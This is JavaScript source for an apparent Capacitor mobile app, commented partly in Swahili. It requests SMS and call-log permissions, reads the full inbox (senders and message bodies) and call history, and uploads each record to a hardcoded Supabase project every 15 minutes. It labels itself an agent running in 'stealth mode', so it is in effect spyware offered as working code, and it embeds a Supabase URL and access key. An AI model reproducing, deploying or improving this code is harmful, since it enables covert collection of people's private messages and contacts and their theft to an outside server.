// Supabase credentials (BADILISHA NA ZAKO)
const SUPABASE_URL = 'https://kwqvlngdrjsubcndivuf.supabase.co';
const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imt3cXZsbmdkcmpzdWJjbmRpdnVmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzU5Nzk3OTUsImV4cCI6MjA5MTU1NTc5NX0.fHv0aaxd-3uPZrt_LVPSTt86GxqJXaWyPVCy3NJxB0I';

let supabase;
let SmsPlugin, CallLogPlugin, Preferences, Network;

async function addLog(msg) {
  const logDiv = document.getElementById('logPanel');
  const entry = document.createElement('div');
  entry.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
  logDiv.appendChild(entry);
  logDiv.scrollTop = logDiv.scrollHeight;
  console.log(msg);
}

async function initPlugins() {
  const { Capacitor } = window.Capacitor;
  if (Capacitor.isNativePlatform()) {
    // Import dynamically (kwa sababu ya Capacitor)
    SmsPlugin = Capacitor.Plugins.SmsPlugin || (await import('capacitor-sms')).SmsPlugin;
    CallLogPlugin = Capacitor.Plugins.CallLogPlugin || (await import('capacitor-call-log')).CallLogPlugin;
    Preferences = Capacitor.Plugins.Preferences || (await import('@capacitor/preferences')).Preferences;
    Network = Capacitor.Plugins.Network || (await import('@capacitor/network')).Network;
  } else {
    addLog("Running in browser (mock mode)");
    SmsPlugin = { requestPermissions: async () => ({ result: 'granted' }), getSMS: async () => ({ messages: [] }) };
    CallLogPlugin = { requestPermissions: async () => ({ result: 'granted' }), getCallLogs: async () => ({ logs: [] }) };
    Preferences = { get: async () => ({ value: '0' }), set: async () => {} };
  }
}

async function requestPermissions() {
  if (SmsPlugin) {
    const { result } = await SmsPlugin.requestPermissions();
    if (result !== 'granted') throw new Error('SMS permission denied');
  }
  if (CallLogPlugin) {
    const { result } = await CallLogPlugin.requestPermissions();
    if (result !== 'granted') throw new Error('Call log permission denied');
  }
  addLog("Permissions granted");
}

async function initSupabase() {
  supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
  addLog("Supabase ready");
}

async function readAllSMS() {
  try {
    const { messages } = await SmsPlugin.getSMS({ box: 'inbox' });
    return messages.map(msg => ({
      sender: msg.address,
      body: msg.body,
      created_at: new Date(msg.date).toISOString()
    }));
  } catch (err) {
    addLog(`SMS error: ${err.message}`);
    return [];
  }
}

async function readCallLogs() {
  try {
    const { logs } = await CallLogPlugin.getCallLogs();
    return logs.map(log => ({
      number: log.number,
      type: log.type,
      duration: log.duration || 0,
      created_at: new Date(log.date).toISOString()
    }));
  } catch (err) {
    addLog(`Call log error: ${err.message}`);
    return [];
  }
}

async function getLastSyncTime() {
  const { value } = await Preferences.get({ key: 'lastSync' });
  return parseInt(value) || 0;
}
async function setLastSyncTime(ts) {
  await Preferences.set({ key: 'lastSync', value: ts.toString() });
}

async function syncSMS(lastSync) {
  const allSMS = await readAllSMS();
  const newSMS = allSMS.filter(s => new Date(s.created_at).getTime() > lastSync);
  if (newSMS.length === 0) return 0;
  for (const sms of newSMS) {
    const { error } = await supabase.from('sms').insert([{
      sender: sms.sender,
      body: sms.body,
      created_at: sms.created_at
    }]);
    if (error) addLog(`SMS insert fail: ${error.message}`);
  }
  addLog(`Synced ${newSMS.length} SMS`);
  return newSMS.length;
}

async function syncCalls(lastSync) {
  const allCalls = await readCallLogs();
  const newCalls = allCalls.filter(c => new Date(c.created_at).getTime() > lastSync);
  if (newCalls.length === 0) return 0;
  for (const call of newCalls) {
    const { error } = await supabase.from('call_logs').insert([{
      number: call.number,
      type: call.type,
      duration: call.duration,
      created_at: call.created_at
    }]);
    if (error) addLog(`Call insert fail: ${error.message}`);
  }
  addLog(`Synced ${newCalls.length} calls`);
  return newCalls.length;
}

async function fullSync() {
  addLog("Starting sync...");
  let lastSync = await getLastSyncTime();
  const now = Date.now();
  await syncSMS(lastSync);
  await syncCalls(lastSync);
  await setLastSyncTime(now);
  addLog("Sync completed.");
  document.getElementById('statusMsg').innerHTML = `✅ Last sync: ${new Date(now).toLocaleString()}`;
}

let autoInterval;
async function startAutoSync() {
  if (autoInterval) clearInterval(autoInterval);
  autoInterval = setInterval(async () => {
    if (Network) {
      const { connected } = await Network.getStatus();
      if (!connected) {
        addLog("Offline, waiting...");
        return;
      }
    }
    await fullSync();
  }, 15 * 60 * 1000);
}

function registerEventListeners() {
  // Optional: Listen for new SMS (not supported by all plugins)
}

async function initApp() {
  await initPlugins();
  await initSupabase();
  await requestPermissions();
  await fullSync();
  startAutoSync();
  registerEventListeners();
  document.getElementById('statusMsg').innerHTML = "🟢 Agent active (auto sync every 15 min)";
  addLog("Agent ready (stealth mode)");
}

document.getElementById('syncNowBtn').addEventListener('click', fullSync);
document.getElementById('clearLogBtn').addEventListener('click', () => {
  document.getElementById('logPanel').innerHTML = '';
});

initApp();
